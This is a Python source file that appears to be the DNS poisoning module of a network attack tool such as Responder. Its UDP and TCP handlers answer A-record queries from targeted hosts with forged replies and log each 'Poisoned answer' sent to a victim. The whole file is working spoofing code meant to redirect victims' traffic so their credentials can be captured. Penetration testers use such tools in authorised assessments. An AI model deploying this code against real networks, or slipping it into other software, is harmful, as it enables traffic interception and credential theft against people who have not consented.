import re

from packets import DNS_Ans
from SocketServer import BaseRequestHandler
from utils import *

def ParseDNSType(data):
	QueryTypeClass = data[len(data)-4:]

	# If Type A, Class IN, then answer.
	return True if QueryTypeClass == "\x00\x01\x00\x01" else False

# DNS Server class
class DNS(BaseRequestHandler):

	def handle(self):

		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None

		try:
			data, soc = self.request

			if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
				buff = DNS_Ans()
				buff.calculate(data)
				soc.sendto(str(buff), self.client_address)

				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				print color("[*] [DNS] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)

		except Exception:
			pass

# DNS Server TCP Class
class DNSTCP(BaseRequestHandler):

	def handle(self):

		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None
	
		try:
			data = self.request.recv(1024)

			if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
				buff = DNS_Ans()
				buff.calculate(data)
				self.request.send(str(buff))

				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				print color("[*] [DNS-TCP] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)

		except Exception:
			pass